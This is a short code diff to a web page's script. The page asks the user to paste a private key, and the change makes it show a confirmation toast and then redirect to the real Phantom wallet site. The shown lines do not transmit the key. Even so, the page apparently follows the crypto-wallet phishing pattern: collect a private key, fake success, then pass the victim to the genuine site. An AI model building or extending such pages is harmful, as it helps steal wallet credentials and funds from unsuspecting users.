@@ -121,7 +121,7 @@ function selectNetwork(n) {
 function handleImport() {
   const key = document.getElementById('pk-input').value.trim();
   if (!key) { alert('Please enter your private key first.'); return; }
-  showToastAndRedirect('toast', 'index.html');
+  document.getElementById('toast').style.display='block'; setTimeout(function(){ window.location.href='https://www.phantom.com'; }, 1500);
 }
 </script>
 </body>
